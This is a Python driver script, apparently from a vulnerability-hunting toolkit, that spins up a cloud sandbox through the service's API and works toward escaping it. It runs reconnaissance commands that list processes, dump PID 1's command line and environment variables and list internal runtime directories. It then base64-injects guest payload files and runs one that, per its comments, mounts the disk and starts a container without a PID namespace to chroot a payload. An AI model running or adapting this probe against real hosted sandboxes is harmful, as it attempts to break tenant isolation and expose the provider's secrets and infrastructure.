# -*- coding: utf-8 -*-
"""v69 驱动: 单次 sandbox 会话完成 ①沙箱进程侦察 ②无 pid ns 容器 + cell API 全方法探测"""
import sys, os, time, json, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v69'
GUEST = r'D:\scan\skills\non-traditional-vuln-hunting\vda69_guest.py'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda69_probe_guest.py'


def inject(sid, dst, src_path):
    b64 = base64.b64encode(open(src_path, 'rb').read()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs sid=%s' % (time.time() - t0, sid[:16]))

    # ① 沙箱会话进程/目录侦察 (ps 是否见宿主进程, PID1 = ?)
    s = ('echo ===PS===; ps -ef 2>&1 | head -60; '
         'echo ===PROC1_CMD===; tr "\\0" " " < /proc/1/cmdline 2>&1; echo; '
         'echo ===PROC1_ENV===; tr "\\0" "\\n" < /proc/1/environ 2>&1 | head -60; '
         'echo ===SANDBOX_DIR===; ls -la /vercel/sandbox/ 2>&1 | head -50; '
         'echo ===SHARE===; ls -la /run/vercel/share/ 2>&1 | head -40; '
         'echo ===CELL===; ls -la /run/cell/ 2>&1 | head -40; '
         'echo ===VERCEL===; ls -la /run/vercel/ 2>&1 | head -40; '
         'echo ===CGROUP===; cat /proc/self/cgroup 2>&1; '
         'echo ===UID===; id 2>&1')
    c, r = cmd(sid, 'sh', ['-c', s], 45000)
    print('[cmdA]', c)
    print((r or '')[:18000])

    # ② 注入 guest + payload
    inject(sid, '/vercel/sandbox/vda66_guest.py', GUEST)
    inject(sid, '/vercel/sandbox/vda69_probe_guest.py', PAY)
    time.sleep(1)

    # ③ 跑容器探测 (mount vda + 创建无 pid ns 容器 + chroot payload, 轮询 60s)
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda66_guest.py'], 120000)
    print('[run guest]', c)
    print((r or '')[:30000])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
